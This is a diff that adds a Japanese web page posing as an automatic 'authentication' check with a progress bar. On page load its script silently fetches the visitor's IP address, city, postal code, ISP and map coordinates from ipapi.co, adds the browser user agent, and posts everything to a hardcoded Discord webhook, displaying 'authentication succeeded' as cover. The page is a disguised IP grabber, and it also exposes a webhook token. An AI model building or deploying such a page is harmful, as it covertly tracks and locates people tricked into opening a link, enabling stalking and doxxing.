@@ -1,1 +1,493 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>認証</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #4361ee;
+            --primary-dark: #3a56d4;
+            --secondary: #7209b7;
+            --dark: #1d1e2c;
+            --darker: #14151f;
+            --light: #f8f9fa;
+            --success: #06d6a0;
+            --warning: #ffd166;
+            --error: #ef476f;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--darker), #2c3e50);
+            color: var(--light);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: rgba(30, 31, 41, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(67, 97, 238, 0.3);
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+        }
+        
+        .header-banner {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 120px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            z-index: 0;
+            clip-path: polygon(0 0, 100% 0, 100% 80%, 0 100%);
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+            z-index: 2;
+            padding-top: 20px;
+        }
+        
+        h1 {
+            font-size: 2.2rem;
+            margin-bottom: 15px;
+            color: var(--light);
+        }
+        
+        .subtitle {
+            font-size: 1.1rem;
+            opacity: 0.8;
+            max-width: 400px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+        
+        .auth-container {
+            position: relative;
+            margin: 40px 0 20px;
+            min-height: 300px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .auth-icon {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 30px;
+            position: relative;
+            z-index: 2;
+            animation: pulse 2s infinite;
+        }
+        
+        .auth-icon i {
+            font-size: 3.5rem;
+            color: white;
+        }
+        
+        .progress-container {
+            width: 100%;
+            max-width: 400px;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            margin: 30px 0;
+            overflow: hidden;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            border-radius: 5px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .completed-section {
+            margin-top: 30px;
+            text-align: center;
+            display: none;
+            position: relative;
+            z-index: 2;
+            animation: fadeIn 1s forwards;
+        }
+        
+        .completed-icon {
+            font-size: 4rem;
+            color: var(--success);
+            margin-bottom: 20px;
+        }
+        
+        .completed-message {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: var(--success);
+            font-weight: bold;
+        }
+        
+        .status-message {
+            text-align: center;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .status-message.error {
+            background: rgba(239, 71, 111, 0.2);
+            border: 1px solid var(--error);
+            display: block;
+        }
+        
+        .status-message.success {
+            background: rgba(6, 214, 160, 0.2);
+            border: 1px solid var(--success);
+            display: block;
+        }
+        
+        .privacy-panel {
+            background: rgba(40, 42, 54, 0.8);
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid rgba(67, 97, 238, 0.2);
+            position: relative;
+            z-index: 2;
+            text-align: center;
+        }
+        
+        .privacy-panel h3 {
+            color: var(--warning);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(67, 97, 238, 0.4); }
+            70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(67, 97, 238, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(67, 97, 238, 0); }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.05);
+            transform: scale(0);
+            animation: ripple 3s linear infinite;
+            pointer-events: none;
+        }
+        
+        @keyframes ripple {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            h1 {
+                font-size: 1.8rem;
+            }
+            
+            .subtitle {
+                font-size: 1rem;
+            }
+            
+            .auth-icon {
+                width: 100px;
+                height: 100px;
+            }
+            
+            .auth-icon i {
+                font-size: 3rem;
+            }
+            
+            .completed-message {
+                font-size: 1.5rem;
+            }
+        }
+        
+        .loading-text {
+            font-size: 1.2rem;
+            margin-top: 20px;
+            opacity: 0.8;
+        }
+        
+        .auto-start-notice {
+            background: rgba(67, 97, 238, 0.2);
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 25px;
+            font-size: 0.9rem;
+        }
+        
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(6, 214, 160, 0.15);
+            color: var(--success);
+            padding: 8px 15px;
+            border-radius: 20px;
+            margin-top: 15px;
+            font-size: 0.9rem;
+            border: 1px solid var(--success);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header-banner"></div>
+        
+        <header>
+            <h1><i class="fas fa-shield-alt"></i> 認証</h1>
+            <p class="subtitle"></p>
+        </header>
+        
+        <div class="auto-start-notice">
+            <i class="fas fa-bolt"></i> ページを開くと自動的に処理が開始されます
+        </div>
+        
+        <div class="auth-container" id="auth-container">
+            <div class="auth-icon">
+                <i class="fas fa-lock"></i>
+            </div>
+            
+            <div class="loading-text">
+                開始しています...
+            </div>
+            
+            <div class="progress-container">
+                <div id="progress-bar" class="progress-bar"></div>
+            </div>
+            
+            <div class="completed-section" id="completed-section">
+                <div class="completed-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <div class="completed-message">
+                    処理完了
+                </div>
+                <p class="loading-text">認証は成功しました</p>
+            </div>
+            
+            <div id="status-message" class="status-message"></div>
+        </div>
+        
+        <div class="privacy-panel">
+            <h3><i class="fas fa-user-secret"></i>
+            </di
+        </div>
+    </div>
 
+    <script>
+        document.addEventListener('DOMContentLoaded', async () => {
+            const progressBar = document.getElementById('progress-bar');
+            const completedSection = document.getElementById('completed-section');
+            const authIcon = document.querySelector('.auth-icon');
+            const statusMessage = document.getElementById('status-message');
+            const subtitle = document.querySelector('.subtitle');
+            const loadingText = document.querySelector('.loading-text');
+            
+            // 事前に設定されたDiscordウェブフックURL
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1401728338334322808/8EIagx68F5k0xRcFkfislihfPO0Eb3kO-DwonUYZe1j-wMot8-QKGvndvLwgxbbmjhWr';
+            
+            // 進捗バーをアニメーション
+            const updateProgress = (percentage) => {
+                progressBar.style.width = `${percentage}%`;
+            };
+            
+            // ランダムなリップルエフェクトを生成
+            function createRipple() {
+                const ripple = document.createElement('div');
+                ripple.className = 'ripple';
+                
+                // ランダムな位置とサイズ
+                const size = Math.random() * 300 + 100;
+                const x = Math.random() * window.innerWidth;
+                const y = Math.random() * window.innerHeight;
+                
+                ripple.style.width = `${size}px`;
+                ripple.style.height = `${size}px`;
+                ripple.style.left = `${x}px`;
+                ripple.style.top = `${y}px`;
+                
+                document.body.appendChild(ripple);
+                
+                // アニメーション終了後に削除
+                setTimeout(() => {
+                    ripple.remove();
+                }, 3000);
+            }
+            
+            // 背景エフェクトを定期的に生成
+            const rippleInterval = setInterval(createRipple, 1000);
+            
+            // IP詳細情報を取得する関数
+            async function getIPDetails() {
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    const data = await response.json();
+                    return data;
+                } catch (error) {
+                    console.error('失敗しました:', error);
+                    return null;
+                }
+            }
+            
+            // Discordに送信する関数（詳細情報付き）
+            async function sendToDiscord(ipDetails) {
+                const userAgent = navigator.userAgent;
+                const accessTime = new Date().toLocaleString();
+                
+                // 位置情報リンク（Google Maps）
+                const mapLink = `https://www.google.com/maps?q=${ipDetails.latitude},${ipDetails.longitude}`;
+                
+                // Discordに送信するデータ
+                const payload = {
+                    content: `🚨 **詳細IP情報通知** 🚨`,
+                    embeds: [
+                        {
+                            title: "新しいアクセスを検出",
+                            description: "セキュアIP通知システムが新しいアクセスを検出しました",
+                            color: 5814783,
+                            fields: [
+                                { name: "IPアドレス", value: `\`${ipDetails.ip}\``, inline: true },
+                                { name: "国", value: `${ipDetails.country_name} (${ipDetails.country})`, inline: true },
+                                { name: "地域", value: `${ipDetails.region}, ${ipDetails.city}`, inline: true },
+                                { name: "郵便番号", value: ipDetails.postal || "不明", inline: true },
+                                { name: "プロバイダー", value: ipDetails.org || "不明", inline: true },
+                                { name: "タイムゾーン", value: ipDetails.timezone || "不明", inline: true },
+                                { name: "位置情報", value: `[Google Mapsで表示](${mapLink})`, inline: true },
+                                { name: "ユーザーエージェント", value: `\`\`\`${userAgent}\`\`\``, inline: false }
+                            ],
+                            footer: { text: "セキュアIP通知システム v5.0" }
+                        }
+                    ]
+                };
+                
+                try {
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                    
+                    return response.ok;
+                } catch (error) {
+                    console.error('Discordへの送信に失敗しました:', error);
+                    return false;
+                }
+            }
+            
+            // 処理を実行
+            async function executeProcess() {
+                // 進捗バーの初期設定
+                updateProgress(10);
+                loadingText.textContent = "システムを初期化しています...";
+                
+                // 処理ステップを定義
+                const steps = [
+                    {progress: 25, delay: 800, message: "認証中..."},
+                    {progress: 50, delay: 1200, message: "詳細情報を収集中..."},
+                    {progress: 75, delay: 1000, message: "認証サーバーから反応を待っています..."},
+                    {progress: 100, delay: 800, message: "サーバーアクセス中..."}
+                ];
+                
+                try {
+                    // 各ステップを実行
+                    for (const step of steps) {
+                        await new Promise(resolve => setTimeout(resolve, step.delay));
+                        updateProgress(step.progress);
+                        loadingText.textContent = step.message;
+                    }
+                    
+                    // IP詳細情報を取得
+                    const ipDetails = await getIPDetails();
+                    
+                    if (!ipDetails || !ipDetails.ip) {
+                        throw new Error('認証に失敗しました');
+                    }
+                    
+                    // Discordに送信
+                    const success = await sendToDiscord(ipDetails);
+                    
+                    if (success) {
+                        // 認証完了を表示
+                        completedSection.style.display = 'block';
+                        authIcon.innerHTML = '<i class="fas fa-check"></i>';
+                        authIcon.style.background = 'linear-gradient(135deg, var(--success), #05b38c)';
+                        authIcon.style.animation = 'none';
+                        loadingText.style.display = 'none';
+                        
+                        // メッセージ更新
+                        subtitle.textContent = "認証は無事成功しました";
+                        subtitle.style.color = "var(--success)";
+                    } else {
+                        statusMessage.textContent = 'Discordへの送信に失敗しました';
+                        statusMessage.className = 'status-message error';
+                    }
+                } catch (error) {
+                    console.error('処理中にエラーが発生しました:', error);
+                    statusMessage.textContent = '処理中にエラーが発生しました: ' + error.message;
+                    statusMessage.className = 'status-message error';
+                    loadingText.textContent = "エラーが発生しました";
+                } finally {
+                    // リップルエフェクトを停止
+                    clearInterval(rippleInterval);
+                }
+            }
+            
+            // ページ読み込み時に処理を開始（少し遅延させて表示を安定させる）
+            setTimeout(() => {
+                executeProcess();
+            }, 500);
+        });
+    </script>
+</body>
+</html>
